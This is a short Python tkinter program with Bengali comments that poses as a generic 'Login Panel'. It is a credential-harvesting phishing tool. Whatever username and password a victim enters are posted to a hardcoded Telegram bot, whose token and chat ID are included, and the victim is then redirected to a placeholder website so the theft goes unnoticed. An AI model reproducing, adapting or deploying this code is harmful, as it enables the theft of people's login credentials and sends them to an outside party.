import tkinter as tk
import requests
import webbrowser

# টেলিগ্রাম বট কনফিগারেশন
BOT_TOKEN = "7934135059:AAFwaqZhu4VXerCCMQJSfb7tsn-9oyk01oU"
CHAT_ID = "6721678542"

# লগইন ফাংশন
def login():
    username = entry_username.get()
    password = entry_password.get()
    
    if username and password:
        message = f"🔔 নতুন লগইন 🔔\n👤 ইউজার: {username}\n🔑 পাসওয়ার্ড: {password}"
        send_telegram_message(message)
        webbrowser.open("https://your-website.com")  # ইউজারকে ওয়েবসাইটে নিয়ে যাবে
    else:
        label_status.config(text="❌ সব ফিল্ড পূরণ করুন!", fg="red")

# টেলিগ্রামে মেসেজ পাঠানোর ফাংশন
def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=payload)

# GUI তৈরি
root = tk.Tk()
root.title("Login Panel")
root.geometry("300x250")

tk.Label(root, text="📌 লগইন করুন", font=("Arial", 14, "bold")).pack(pady=10)
tk.Label(root, text="ইউজারনেম:", font=("Arial", 12)).pack()
entry_username = tk.Entry(root)
entry_username.pack(pady=5)

tk.Label(root, text="পাসওয়ার্ড:", font=("Arial", 12)).pack()
entry_password = tk.Entry(root, show="*")
entry_password.pack(pady=5)

button_login = tk.Button(root, text="✅ লগইন", font=("Arial", 12, "bold"), bg="green", fg="white", command=login)
button_login.pack(pady=10)

label_status = tk.Label(root, text="", font=("Arial", 10))
label_status.pack()

root.mainloop()